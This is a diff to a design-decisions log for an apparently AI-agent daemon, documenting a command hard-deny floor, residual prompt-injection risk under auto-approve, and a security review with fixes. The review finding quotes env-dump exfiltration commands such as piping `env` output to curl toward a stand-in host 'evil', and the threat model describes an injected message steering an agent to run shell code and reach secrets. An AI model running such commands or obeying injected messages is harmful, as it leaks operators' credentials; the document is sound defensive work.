@@ -986,10 +986,16 @@ of the live `conduit.sqlite` (existing rows adopt `source='config'` + `auto_appr
   stopping an injection-steered architect turn from exfiltrating the daemon's own
   credentials or destroying the host. `pd.action==="deny"` never reaches the auto-approve
   branch, so the floor is structurally intact. **Residual risk (accepted, documented):**
-  an injected member message + an innocuous architect turn can run arbitrary IN-WORKTREE
-  code without a click — bounded by the disposable worktree, framing rules, verified-
-  surface gating, initiator carry-forward, and full audit. Removing the floor too is a
-  separate, riskier decision the user can still make.
+  under auto-approve-everything an injected member message + an innocuous architect turn
+  can run arbitrary IN-WORKTREE bash without a click. The floor blocks the sharpest
+  credential-exfil shapes (credential FILES, literal daemon-token names, and — added in
+  the 2026-07-19 review — env dumps: `env`/`printenv`/`/proc/*/environ`), but it is NOT a
+  complete exfil barrier: the agent's shell still inherits the daemon's `process.env`
+  (incl. the Claude OAuth token, which the SDK legitimately needs), so a determined
+  in-worktree command can still reach some secrets. The real fix is M4 process isolation +
+  scoped/scrubbed daemon credentials; until then the residual is bounded by the disposable
+  worktree, framing rules, verified-surface gating, initiator carry-forward, and full
+  audit. Removing the floor too is a separate, riskier decision the user can still make.
 - **Resume safety (anti-laundering):** a defer→resume is governed by the ORIGINAL
   initiator, carried on the approval (`approvals.initiated_by`), NEVER the approving
   decider. Since resume is only reached after an architect passes the decider check,
@@ -1053,4 +1059,47 @@ as the primary after-the-fact review surface. (b) The residual injection→in-wo
 window is the strongest argument for M4 session/process isolation + scoped daemon
 credentials (so even a floor-respecting compromise has minimal blast radius). (c) Revisit
 whether the hard-deny floor should stay non-overridable for architects (the user may want
-it removed; keep it until isolation lands).
+it removed; keep it until isolation lands). (d) Scrub the non-SDK daemon secrets
+(SLACK_BOT_TOKEN/SLACK_APP_TOKEN, AWS_*) from the env the agent's shell inherits — the SDK
+needs only its Claude auth token, so the Slack/cloud tokens should not be reachable by an
+in-worktree `env`/file read at all (the env-dump floor is a stopgap, not the barrier).
+
+### 2026-07-19 — M3.8 adversarial review: 3 confirmed findings, all fixed same day
+
+A 4-dimension multi-agent review (auth-bypass, hard-deny-floor, persistence, correctness)
+with refute-by-default verification confirmed 3 real findings (from 6 reported; the
+duplicates collapsed to two root causes). All fixed before the branch was considered done;
+regression tests added (252 tests green).
+
+- **(high) Grant could strip a config architect's protection → admin lockout.** Granting
+  `architect` to someone who is ALREADY a config architect at the same `(principal, scope)`
+  skipped the shadow-demote guard (which only ran for non-architect roles), and `setRole`'s
+  `ON CONFLICT ... SET source=$src` flipped their row `config`→`grant`. A later `revoke`
+  (now matching `source='grant'`) then deleted it — a delegated architect could permanently
+  lock out the config-designated admin, and a config architect became runtime-revokable
+  (breaking the documented invariant). **Fix:** the grant guard now refuses ANY grant that
+  would overwrite an exact-scope config row (not just demotions), plus the existing
+  broader-scope shadow-demote check. Additive elevations at a new scope (e.g. a config
+  member → architect in one channel) stay allowed. Regression tests: grant-over-config is
+  refused, the row stays `source='config'`, and a follow-up revoke can't remove it.
+- **(high) `env`/`printenv` exfiltration under auto-approve.** `curl -d "$(env)" evil`,
+  `env | curl`, `printenv`, `cat /proc/self/environ` were classified `gate` (bashHardDeny
+  matched only credential FILES and literal token NAMES), so auto-approve ran them without a
+  click, leaking `process.env` (Slack tokens etc.). **Fix:** bashHardDeny now hard-denies
+  env dumps — `printenv`, a bare `env` (no command to exec), and `/proc/<pid>/environ` —
+  scanning operator-split segments AND `$(...)`/backtick substitution contents. `env FOO=bar
+  cmd` (a legitimate prefix) is unaffected. The DECISIONS/DESIGN framing was corrected: the
+  floor is a stopgap that blocks the sharpest shapes, not a complete exfil barrier (M4
+  isolation is). Regression tests added in policy.test.ts.
+- **(low) `revoke` misdirected to config on a scope mismatch.** Revoking a `'*'` grant with
+  a channel-scoped command (or vice-versa) removed 0 rows, then reported "comes from config"
+  because `isArchitect` is source-agnostic. **Fix:** the fallback consults `getRoleRow` — it
+  says "comes from config" only for a genuine config row, and otherwise hints at the correct
+  scope (`everywhere` / a specific channel). Regression test added.
+
+**Process note:** the adversarial-review workflow earned its cost on a security-critical
+change — the config-architect lockout was a real, exploitable invariant break that the 34
+feature tests missed (they only covered direct revoke of a config architect, not the
+grant-flip-then-revoke path). Re-confirms the ultracode habit: adversarially verify
+security-relevant diffs before shipping, and let refute-by-default kill the false positives
+(3 of 6 reported findings were duplicates/over-severity, correctly collapsed).
